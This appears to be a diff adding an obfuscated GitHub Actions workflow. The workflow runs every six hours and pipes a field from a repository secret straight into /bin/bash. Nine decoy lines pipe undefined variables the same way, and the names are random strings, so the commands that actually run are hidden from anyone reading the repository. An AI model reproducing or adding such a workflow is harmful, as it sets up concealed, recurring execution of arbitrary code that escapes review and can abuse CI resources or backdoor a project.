@@ -1,0 +1,26 @@
+name: judatuox
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: judatuox
+        env:
+          vly05: ${{ secrets.vly05 }}
+        run: |
+          echo $vly05 | jq -r .yrf78924 | /bin/bash
+          echo $d63552 | jq -r .s40 | /bin/bash
+          echo $egbcy569 | jq -r .z045 | /bin/bash
+          echo $rfdi89 | jq -r .iyo1939 | /bin/bash
+          echo $tbesz50531 | jq -r .d40 | /bin/bash
+          echo $zfpj4771 | jq -r .dfqh32147 | /bin/bash
+          echo $sp797 | jq -r .ej86 | /bin/bash
+          echo $d0302 | jq -r .ui3 | /bin/bash
+          echo $hx0147 | jq -r .gpt4537 | /bin/bash
+          echo $gfp39130 | jq -r .wcp8544 | /bin/bash
+
